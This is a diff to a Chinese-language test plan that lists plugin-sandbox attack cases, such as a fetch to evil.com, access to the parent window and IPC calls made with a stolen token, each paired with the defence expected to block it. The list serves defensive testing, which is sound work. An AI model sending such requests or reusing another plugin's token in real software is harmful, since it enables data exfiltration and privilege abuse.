@@ -504,7 +504,7 @@ async fn malicious_plugin_loop_does_not_harm_kernel() {
 
 | #  | 攻击                                          | 期望结果                                    |
 | -- | --------------------------------------------- | ------------------------------------------- |
-| 1  | `fetch('http://evil.com')`                      | 被 CSP `connect-src 'none'` 阻止             |
+| 1  | `fetch('http://evil.com')`                      | 被 CSP 的本机 IPC 白名单阻止             |
 | 2  | `window.parent.document.body`                   | 跨 origin 被阻止                             |
 | 3  | `localStorage.setItem(...)`                     | 无持久化（独立 profile），不影响宿主            |
 | 4  | 用其它插件的 token 调 IPC                        | 拒绝（token 与 plugin_id 绑定校验）            |
